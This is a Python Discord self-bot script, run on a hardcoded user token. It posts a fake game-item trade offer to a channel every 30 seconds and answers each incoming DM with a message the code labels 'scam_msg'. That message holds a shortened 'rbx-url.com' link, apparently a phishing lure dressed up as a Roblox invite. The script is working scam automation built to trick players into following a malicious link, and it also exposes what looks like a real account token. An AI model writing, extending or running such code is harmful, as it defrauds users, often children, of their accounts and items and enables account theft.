import requests
import time
import threading

TOKEN = "MTMyMTkxODAzNDM2NDg1ODM4OQ.GxKuxf.VX5KisL2Fn31-b-BNKk6A2_a_gvMw0OIVcq94g"
CHANNEL_ID = "1392156886136131644"  # Your given channel ID
HEADERS = {
    "Authorization": TOKEN,
    "Content-Type": "application/json"
}

def send_message():
    url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages"
    data = {
        "content": "**Trading my CORRUPTED KITSUNE for your CORRUPTED KODAMA (I can go first because i need vouches)**"
    }
    while True:
        try:
            requests.post(url, json=data, headers=HEADERS)
        except Exception as e:
            print(f"Error sending message: {e}")
        time.sleep(30)

def listen_for_dms():
    url = "https://discord.com/api/v9/users/@me/channels"
    while True:
        try:
            response = requests.get(url, headers=HEADERS)
            channels = response.json()
            for channel in channels:
                if channel.get("type") == 1:  # DM channel
                    messages_response = requests.get(
                        f"https://discord.com/api/v9/channels/{channel['id']}/messages?limit=1",
                        headers=HEADERS
                    )
                    messages = messages_response.json()
                    if not messages:
                        continue
                    last_msg = messages[0]
                    author = last_msg.get("author", {})
                    content = last_msg.get("content", "")
                    if not author.get("bot", False) and "hmm alright" not in content.lower():
                        time.sleep(10)
                        scam_msg = ("hmm alright, heres the link, join me and ill go first but dont scam me pls\n"
                                    "[https://rbx-url.com/MHjNWYI-](https://rbx-url.com/MHjNWYI-)")
                        requests.post(
                            f"https://discord.com/api/v9/channels/{channel['id']}/messages",
                            json={"content": scam_msg},
                            headers=HEADERS
                        )
        except Exception as e:
            print(f"Error listening for DMs: {e}")
        time.sleep(5)

threading.Thread(target=send_message, daemon=True).start()
threading.Thread(target=listen_for_dms, daemon=True).start()

# Keep the main thread alive
while True:
    time.sleep(1)
